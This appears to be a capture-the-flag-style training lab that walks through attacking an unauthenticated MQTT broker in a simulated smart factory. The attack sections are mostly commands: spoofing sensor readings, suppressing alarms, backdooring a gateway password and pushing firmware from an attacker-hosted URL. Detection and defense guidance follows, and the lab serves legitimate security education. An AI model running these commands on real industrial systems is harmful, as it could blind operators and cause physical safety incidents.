# Lab 7: IIoT/MQTT Infrastructure Attack

## Overview
| Property | Value |
|----------|-------|
| Duration | 90 minutes |
| Difficulty | Advanced |
| Protocol | MQTT |
| Scenario | Smart Factory IIoT |
| Attacker IP | 10.0.7.100 |

## Learning Objectives
By completing this lab, you will:
1. Understand MQTT protocol and IIoT architecture
2. Exploit unauthenticated MQTT brokers
3. Enumerate topics and discover attack surface
4. Manipulate sensor data and configurations
5. Compromise edge gateways
6. Execute multi-stage IIoT attack chains

## Background

### MQTT Protocol
MQTT (Message Queuing Telemetry Transport) is the dominant protocol for IIoT:
- Publish/Subscribe model
- Lightweight for constrained devices
- Topics organized hierarchically
- QoS levels (0, 1, 2)

**Default Port: 1883** (unencrypted), 8883 (TLS)

### Attack Surface
```
┌─────────────────────────────────────────────────────┐
│                    CLOUD                             │
│              (Remote Monitoring)                     │
└───────────────────────┬─────────────────────────────┘
                        │
┌───────────────────────▼─────────────────────────────┐
│                MQTT BROKER                           │
│          (No Authentication!)                        │
│              Port 1883                               │
└───────────────────────┬─────────────────────────────┘
                        │
    ┌───────────────────┼───────────────────┐
    │                   │                   │
┌───▼────┐        ┌─────▼─────┐       ┌─────▼─────┐
│Edge GW │        │ Edge GW   │       │ Edge GW   │
│ Line 1 │        │  Line 2   │       │  Utility  │
└───┬────┘        └─────┬─────┘       └─────┬─────┘
    │                   │                   │
┌───▼───┐          ┌────▼────┐         ┌────▼────┐
│Sensors│          │ Sensors │         │ Sensors │
└───────┘          └─────────┘         └─────────┘
```

### Vulnerabilities
- **No Authentication**: Anyone can connect
- **No Authorization**: All topics accessible
- **No Encryption**: Traffic in plaintext
- **Default Credentials**: Gateways use admin/admin123
- **Command Topics**: Control messages accepted from any client
- **Firmware Updates**: OTA updates via MQTT

## Part 1: MQTT Reconnaissance (20 min)

### Task 1.1: Access Attacker Workstation
```bash
docker exec -it vulnot-attacker-mqtt bash
```

### Task 1.2: Discover MQTT Broker
```bash
vulnot-mqtt scan -n 10.0.7.0/24
```

Expected output:
```
╔════════════════════════════════════════╗
║      VULNOT MQTT Broker Scanner        ║
╚════════════════════════════════════════╝

Discovered MQTT Brokers
┌────────────┬──────┬─────────────────────┐
│ IP Address │ Port │ Status              │
├────────────┼──────┼─────────────────────┤
│ 10.0.7.5   │ 1883 │ No Auth Required!   │
└────────────┴──────┴─────────────────────┘
```

**🚩 FLAG: mqtt_broker_found**

### Task 1.3: Topic Enumeration
Subscribe to all topics:
```bash
vulnot-mqtt enum -b 10.0.7.5 -d 30
```

Document the topic structure:
```
factory/sensors/line1/TEMP-L1-01
factory/sensors/line1/VIB-L1-01
factory/sensors/line2/...
factory/control/+/cmd          <- ATTACK VECTOR
factory/gateway/+/config       <- ATTACK VECTOR
factory/firmware/+/update      <- ATTACK VECTOR
```

**🚩 FLAG: mqtt_enum_complete**

## Part 2: Passive Intelligence Gathering (15 min)

### Task 2.1: Monitor Sensor Traffic
```bash
vulnot-mqtt subscribe -b 10.0.7.5 -t 'factory/sensors/#'
```

Observe:
- Sensor IDs and naming convention
- Data formats (JSON)
- Update frequencies
- Normal value ranges

### Task 2.2: Identify Sensitive Topics
Look for:
- Command/control topics
- Configuration topics
- Firmware/update topics
- Gateway management topics

### Task 2.3: Map Edge Gateways
From the traffic, identify:
- Gateway IDs (GW-LINE1, GW-LINE2, etc.)
- Gateway IP addresses
- Connected sensors per gateway

## Part 3: Sensor Manipulation Attacks (20 min)

### ⚠️ WARNING
These attacks manipulate sensor readings that operators rely on for decision-making. In real environments, this could lead to incorrect actions and safety incidents.

### Attack 3.1: Sensor Data Spoofing
Inject false temperature reading:
```bash
vulnot-mqtt publish -b 10.0.7.5 \
  -t 'factory/sensors/line1/TEMP-L1-01' \
  --payload '{"sensor_id":"TEMP-L1-01","value":25.0,"alarm":false}'
```

**Impact**: Operators see false "normal" temperature while actual temp may be critical.

### Attack 3.2: Calibration Manipulation
Modify sensor offset to hide real values:
```bash
vulnot-mqtt publish -b 10.0.7.5 \
  -t 'factory/control/TEMP-L1-01/cmd' \
  --payload '{"offset": -30}'
```

**Impact**: Sensor continues reporting, but values are shifted by -30°C. A real temperature of 85°C appears as 55°C.

### Attack 3.3: Alarm Suppression
Raise alarm thresholds to prevent alerts:
```bash
vulnot-mqtt publish -b 10.0.7.5 \
  -t 'factory/control/TEMP-L1-01/cmd' \
  --payload '{"high_alarm": 999, "low_alarm": -999}'
```

**Impact**: No alarms will trigger regardless of actual sensor values.

**🚩 FLAG: mqtt_sensor_manipulation**

## Part 4: Gateway Compromise (20 min)

### Attack 4.1: Gateway Credential Discovery
Check for default credentials via MQTT config topics:
```bash
vulnot-mqtt subscribe -b 10.0.7.5 -t 'factory/gateway/#'
```

### Attack 4.2: Change Gateway Password
Exploit writable config to backdoor gateway:
```bash
vulnot-mqtt publish -b 10.0.7.5 \
  -t 'factory/gateway/GW-LINE1/config' \
  --payload '{"admin_password": "hacked123"}'
```

### Attack 4.3: SSH to Compromised Gateway
```bash
ssh admin@10.0.7.10
# Password: hacked123
```

**Impact**: Full control of edge gateway, ability to manipulate all connected sensors.

**🚩 FLAG: mqtt_gateway_pwned**

## Part 5: Firmware Supply Chain Attack (15 min)

### Attack 5.1: Malicious Firmware Update
Trigger firmware update from attacker-controlled server:
```bash
vulnot-mqtt publish -b 10.0.7.5 \
  -t 'factory/firmware/GW-LINE1/update' \
  --payload '{"url": "http://10.0.7.100:8080/malicious_firmware.bin"}'
```

### Attack 5.2: Persistence
Backdoored firmware provides:
- Persistent access
- Rootkit capabilities
- Data exfiltration
- Lateral movement base

**🚩 FLAG: mqtt_firmware_attack**

## Part 6: APT-Style Attack Chain

### Complete Attack Sequence
1. **Reconnaissance**: Enumerate MQTT topics
2. **Initial Access**: Connect to unauthenticated broker
3. **Discovery**: Map sensors and gateways
4. **Collection**: Monitor sensor data
5. **Credential Access**: Discover default passwords
6. **Lateral Movement**: SSH to gateways
7. **Persistence**: Deploy backdoored firmware
8. **Impact**: Manipulate sensor readings

### Use APT Campaign Manager
```bash
vulnot-apt start iiot_compromise
vulnot-apt run
```

## Real-World Context

### Shodan Statistics
Thousands of MQTT brokers exposed on the internet:
- Many with no authentication
- Publishing sensitive industrial data
- Accepting commands from anyone

### Notable IIoT Incidents

**Verkada Camera Breach (2021)**
- 150,000 cameras compromised
- Access via exposed credentials
- IIoT device management platform

**Triton/TRISIS (2017)**
- Safety system targeting
- IIoT-style attack methodology
- Multi-stage compromise

## Detection & Defense

### What Would IDS See?
```
[MQTT-001] Anonymous MQTT Connection - 10.0.7.100
[MQTT-002] Wildcard Subscription (#) - 10.0.7.100
[MQTT-003] Publish to Control Topic - 10.0.7.100
[MQTT-004] Gateway Config Change - firmware update trigger
```

### Defensive Measures
1. **Enable Authentication**: Username/password or certificates
2. **Implement ACLs**: Restrict topic access by client
3. **Use TLS**: Encrypt all MQTT traffic
4. **Network Segmentation**: Isolate MQTT broker
5. **Firmware Signing**: Verify firmware integrity
6. **Monitor Control Topics**: Alert on unexpected publishers
7. **Change Default Credentials**: All gateways and devices

## Assessment Questions

1. Why is MQTT's publish/subscribe model a security concern?
2. How does topic enumeration enable further attacks?
3. What's the impact of sensor calibration manipulation?
4. Why are edge gateways high-value targets?
5. How can firmware updates be weaponized?

## Flags Summary
| Flag | Points | Description |
|------|--------|-------------|
| mqtt_broker_found | 10 | Discovered MQTT broker |
| mqtt_enum_complete | 15 | Enumerated all topics |
| mqtt_sensor_manipulation | 20 | Manipulated sensor data |
| mqtt_gateway_pwned | 25 | Compromised edge gateway |
| mqtt_firmware_attack | 30 | Executed firmware attack |

## Next Steps
- Explore threat hunting for MQTT attacks
- Practice incident response with playbooks
- Try multi-protocol attack chains
